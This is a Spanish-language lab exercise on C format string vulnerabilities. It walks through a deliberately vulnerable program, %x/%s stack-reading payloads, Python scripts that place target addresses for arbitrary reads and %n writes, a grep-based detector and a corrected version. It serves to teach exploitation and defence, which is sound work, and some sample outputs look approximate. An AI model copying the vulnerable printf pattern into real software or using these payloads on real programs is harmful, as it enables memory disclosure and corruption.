# Ejercicio 05: Format String Vulnerabilities

## Objetivos de Aprendizaje

- Entender por qué format strings son peligrosas
- Leer memoria arbitraria (%x, %s)
- Escribir en memoria arbitraria (%n)
- Detectar y explotar format strings

## Tiempo Estimado

90-120 minutos

## Dificultad

⭐⭐⭐ Intermedio-Avanzado

---

## Parte 1: Entender Format Strings

### ¿Qué es un format string?

```c
printf("Hola %s, tienes %d años\n", nombre, edad);
//      ↑ Format string (especificadores: %s, %d)
```

### Problema: Format string controlada por usuario

```c
char entrada[100];
scanf("%s", entrada);
printf(entrada);  // ¡VULNERABLE!

// Si usuario entra: "Hola %x"
// printf interpretará %x como especificador
// y mostrará valores del stack
```

### Programa Vulnerable Simple

```bash
cat > vulnerable_format.c << 'EOF'
#include <stdio.h>
#include <string.h>

void procesar_usuario(char *usuario) {
    char buffer[32];
    
    printf("[*] Bienvenido: ");
    printf(usuario);  // ¡VULNERABLE! usuario es format string
    printf("\n");
    
    printf("[*] Datos internos del programa:\n");
    
    // Información que NO debería verse
    int numero_secreto = 0xDEADBEEF;
    char *string_secreto = "ESTE_ES_MI_SECRETO";
    
    printf("[*] Buffer adicionalmente contiene: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Uso: %s <usuario>\n", argv[0]);
        return 1;
    }
    
    procesar_usuario(argv[1]);
    
    return 0;
}
EOF
```

### Compilar

```bash
gcc -g -O0 -fno-stack-protector -o vulnerable_format vulnerable_format.c
```

---

## Parte 2: Lectura de Memoria (%x)

### Entender el Stack

```
printf(usuario);
     ↓
El CPU ve: printf recibió UNA dirección de string
           Esta dirección está en RDI (convención x86-64)

Si usuario = "Hola",
  printf imprime: "Hola"

Si usuario = "Hola %x",
  printf imprime: "Hola" y luego...
  "%x" le dice: imprime el próximo argumento en hex
  Pero NO hay próximo argumento...
  Entonces imprime lo que hay en stack donde debería estar
```

### Prueba 1: Leer valores del stack

```bash
./vulnerable_format "AAAA %x"
# Output:
# Bienvenido: AAAA 7ffffffde4c0
#                    ↑ Valor del stack (probablemente)
```

### Prueba 2: Leer múltiples valores

```bash
./vulnerable_format "AAAA %x %x %x %x %x"
# Output:
# Bienvenido: AAAA 7ffffffde4c0 0 12345678 ffffffff deadbeef
#                    ↑ valor 1  ↑ 2 ↑ 3     ↑ 4      ↑ 5
```

Cada `%x` toma el siguiente argumento del stack.

### Prueba 3: Leer string (%s)

```bash
./vulnerable_format "AAAA %s"
# Output:
# Bienvenido: AAAA (segmentation fault o string basura)
#                   ↑ Interpreta valor del stack como dirección
#                     y trata de leer string desde esa dirección
```

---

## Parte 3: Encontrar el Offset

Para explotar format strings, necesitas saber dónde estás en el stack.

### Técnica: Marcar tu entrada

```bash
./vulnerable_format "AAAA %x %x %x %x %x"
# ¿Cuál valor es tu "AAAA"?

# Si sale: AAAA 4141 (en hex: 0x4141)
# ¡Encontraste tu offset!
# "AAAA" está en el 1er %x
```

### Búsqueda más precisa

```bash
python3 << 'EOF'
import subprocess

# Marcar con un patrón único
marca = "BBBB"  # 0x42424242
entrada = marca

for i in range(1, 10):
    entrada = marca + " %x" * i
    resultado = subprocess.run(["./vulnerable_format", entrada],
                              capture_output=True, text=True)
    print(f"Intento {i}:")
    print(resultado.stdout)
    
    # Verificar si encontramos la marca
    if "42424242" in resultado.stdout or "BBBB" in resultado.stdout:
        print(f"  ✓ Marca encontrada en intento {i}")
EOF
```

---

## Parte 4: Lectura de Dirección Específica

### Caso: Leer contenido de variable

```bash
# Obtener dirección de "numero_secreto" con GDB:
gdb ./vulnerable_format

(gdb) break procesar_usuario
(gdb) run "dummy"
(gdb) info locals
numero_secreto = <optimized out>  # Hmm, tal vez -O0 no la vea
(gdb) print &numero_secreto
$1 = 0x7ffffffde4bc
```

Mejor: hacerlo desde el programa:

```bash
cat > leak_mem.c << 'EOF'
#include <stdio.h>

int main() {
    int secreto = 0xDEADBEEF;
    printf("Dirección de secreto: %p\n", (void *)&secreto);
    return 0;
}
EOF

gcc -o leak_mem leak_mem.c
./leak_mem
# Output: Dirección de secreto: 0x7ffffffde4bc
```

### Crear exploit para leer esa dirección

Técnica: Almacenar dirección en entrada, luego leerla con %s

```python
python3 << 'EOF'
from struct import pack
import subprocess

# La dirección que queremos leer
target_addr = 0x7ffffffde4bc

# Crear payload
payload = pack("<Q", target_addr)  # Guardar dirección en primeros 8 bytes
payload += b" %s"  # Pedir leer string desde esa dirección

# Ejecutar
resultado = subprocess.run(["./vulnerable_format", payload],
                          capture_output=True, text=True)
print("Resultado:")
print(resultado.stdout)
print(resultado.stderr)
EOF
```

---

## Parte 5: Escritura de Memoria (%n)

### Cómo funciona %n

```c
int contador = 0;
printf("Hola %n", &contador);  // contador ahora = 4
                ↑ Especificador %n
                Escribe cantidad de caracteres impresos en dirección dada
```

### El Ataque

Si puedes controlar el segundo argumento (donde apunta):

```c
// Vulnerable
char usuario[100];
scanf("%s", usuario);
int objetivo = 0;
printf(usuario);  // Si usuario contiene %n...
```

```bash
./programa "AAAA %n"
# Si estructura de memoria es correcta
# "AAAA" (4 bytes) se escribe en dirección controlada
```

### Escritura Práctica

```python
python3 << 'EOF'
from struct import pack
import subprocess

# Dirección donde escribir (por ejemplo, variable global)
target_addr = 0x7ffffffde4bc
valor = 42

# Crear payload
# Necesitamos:
# 1. Dirección de la variable objetivo
# 2. "Rellenar" con bytes hasta el valor deseado
# 3. %n para escribir

payload = pack("<Q", target_addr)
# Relleno para llegar a cantidad deseada
payload += b"A" * (valor - 8)  # 8 bytes ya usados por dirección
payload += b" %n"

resultado = subprocess.run(["./vulnerable_format", payload],
                          capture_output=True, text=True)
print("Resultado:", resultado.stdout)
EOF
```

---

## Parte 6: Análisis de Vulnerabilidad

### Crear herramienta de análisis

```bash
cat > detectar_format.sh << 'EOF'
#!/bin/bash
# Detectar format strings en código

archivo=$1

echo "=== Buscando printf/sprintf potencialmente vulnerables ==="
echo ""

grep -n "printf.*(" "$archivo" | while read linea; do
    echo "Línea: $linea"
    
    # Verificar si está usando variable como formato
    if echo "$linea" | grep -q "printf\s*(\s*[a-zA-Z_]"; then
        echo "  [!] POSIBLE VULNERABILIDAD: variable como format string"
    fi
done
EOF

chmod +x detectar_format.sh
./detectar_format.sh vulnerable_format.c
```

### Tabla de Especificadores Peligrosos

```
Especificador | Acción           | Riesgo
%x            | Lee del stack    | Lectura de memoria
%p            | Lee dirección    | Leak de direcciones
%s            | Lee string       | Lectura de memoria
%n            | Escribe en dir   | CRÍTICO - escritura arbitraria
%c            | Lee un byte      | Información leak
%d            | Lee entero       | Información leak
```

---

## Parte 7: Código Correcto

### Versión Segura

```bash
cat > seguro_format.c << 'EOF'
#include <stdio.h>
#include <string.h>

void procesar_usuario(char *usuario) {
    char buffer[32];
    
    printf("[*] Bienvenido: ");
    printf("%s\n", usuario);  // SEGURO - format string es literal
    
    printf("[*] Datos internos del programa:\n");
    
    int numero_secreto = 0xDEADBEEF;
    char *string_secreto = "ESTE_ES_MI_SECRETO";
    
    printf("[*] Buffer adicionalmente contiene: %s\n", buffer);
}

int main(int argc, char **argv) {
    if (argc < 2) {
        printf("Uso: %s <usuario>\n", argv[0]);
        return 1;
    }
    
    procesar_usuario(argv[1]);
    
    return 0;
}
EOF

gcc -g -O0 -o seguro_format seguro_format.c
```

### Prueba

```bash
./seguro_format "AAAA %x %x %x"
# Output:
# Bienvenido: AAAA %x %x %x
# ↑ Se imprime literalmente, NO se interpreta
```

---

## Checkpoints

✅ Completaste cuando:

- [ ] Compilaste vulnerable_format.c
- [ ] Ejecutaste con "%x" y viste valores del stack
- [ ] Encontraste tu marca ("AAAA" o similar)
- [ ] Leíste múltiples valores del stack
- [ ] Intentaste leer un string con "%s"
- [ ] Entendiste por qué %s trata valor como dirección
- [ ] Creaste versión segura con format string literal
- [ ] Verificaste que versión segura NO interpreta %x

---

## Desafío Extra

### Nivel 1: Automatizar búsqueda de offset

```python
#!/usr/bin/env python3
from struct import pack
import subprocess

def find_offset(program):
    """Encuentra el offset a tu entrada en el stack"""
    marca = 0x41414141  # "AAAA"
    
    for offset in range(0, 10):
        payload = pack("<Q", marca) + b" " + b"%x " * offset
        resultado = subprocess.run([program, payload],
                                  capture_output=True, text=True)
        
        if "41414141" in resultado.stdout:
            return offset
    
    return None

offset = find_offset("./vulnerable_format")
print(f"Offset encontrado: {offset}")
```

### Nivel 2: Leak de dirección específica

```python
# Leer dirección de printf@got (para ASLR bypass)
# (Avanzado, requiere análisis binario)
```

### Nivel 3: Exploit con %n

```python
# Escribir dirección de función a memoria
# Cambiar comportamiento del programa
# (Muy avanzado, requiere conocimiento previo)
```

---

## Conceptos Clave Aprendidos

### Format Strings
- Format string debe ser literal
- Nunca printf(usuario_input)
- %x, %s, %n son especiales

### Explotación
- Leer memoria con %x y %s
- Escribir memoria con %n
- Offset a tu entrada es clave

### Defensa
- Siempre formato literal
- No dejes usuario controlar formato
- Validar entrada

---

## Lecturas Relacionadas

- `recursos/glosario.md` - Format string vulnerabilities
- `recursos/gdb-guia.md` - Debugging de format strings
- `referencias.md` - Artículos clásicos sobre format strings

## Siguiente

**Ejercicio 06:** Introducción a ROP Gadgets (búsqueda de gadgets útiles)
